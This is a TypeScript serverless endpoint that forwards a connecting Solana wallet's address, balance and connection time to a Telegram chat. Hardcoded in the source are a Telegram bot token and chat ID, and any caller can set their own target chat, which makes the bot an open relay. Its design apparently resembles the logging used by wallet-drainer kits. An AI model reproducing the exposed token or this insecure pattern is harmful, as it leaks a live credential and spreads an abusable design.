// /api/tg-log.ts

export const config = {
  runtime: "edge",
};

// --- DİKKAT: Bu değerler sabit yazıldı ---
const TELEGRAM_BOT_TOKEN = "8095409844:AAGvENawEBNP43uR-Lwc99UuiQxS67RKrvs";
const TELEGRAM_CHAT_ID = "-5047891529";

// Ondalıktan sonra ilk 4 hane (yuvarlamasız)
function trunc4(n: number | string) {
  const x = Number(n);
  return (Math.trunc(x * 1e4) / 1e4).toFixed(4);
}

// İstanbul saati: "20.09 - 14:35"
function formatTR(dtISO?: string) {
  const d = new Date(dtISO || Date.now());
  const parts = new Intl.DateTimeFormat("tr-TR", {
    timeZone: "Europe/Istanbul",
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  }).formatToParts(d);
  const get = (t: string) => parts.find(x => x.type === t)?.value || "";
  return `${get("day")}.${get("month")} - ${get("hour")}:${get("minute")}`;
}

export default async function handler(req: Request) {
  if (req.method !== "POST") {
    return new Response(JSON.stringify({ ok: false, error: "Only POST" }), {
      status: 405,
      headers: { "Content-Type": "application/json" },
    });
  }

  try {
    const { address, chatId, solBalance, connectedAtISO } = (await req.json() || {}) as {
      address?: string;
      chatId?: string;
      solBalance?: number | string;
      connectedAtISO?: string;
    };

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return new Response(JSON.stringify({ ok: false, error: "Telegram config missing" }), {
        status: 500,
        headers: { "Content-Type": "application/json" },
      });
    }

    // Gelen chatId varsa onu kullan, yoksa env/sabit default degeri kullan
    const targetChatId = chatId || TELEGRAM_CHAT_ID;

    if (!address) {
      return new Response(JSON.stringify({ ok: false, error: "address required" }), {
        status: 400,
        headers: { "Content-Type": "application/json" },
      });
    }

    const addr = String(address);
    const connectedTR = formatTR(connectedAtISO);
    const sol4 = trunc4(solBalance ?? 0);

    // Mesaj formatı: sadece emojiler, kalın, adres tıklanabilir
    const text =
      `<b>👛: <a href="https://solscan.io/account/${addr}">${addr}</a></b>\n` +
      `<b>⏰: ${connectedTR}</b>\n` +
      `<b>💰: ${sol4}</b>`;

    const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;

    const tg = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        chat_id: targetChatId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!tg.ok) {
      const err = await tg.text();
      console.error("Telegram error:", err.slice(0, 500));
      return new Response(JSON.stringify({ ok: false, error: "Telegram failed", detail: err }), {
        status: 500,
        headers: { "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ ok: true }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch (e) {
    console.error("Handler error:", e);
    return new Response(JSON.stringify({ ok: false }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}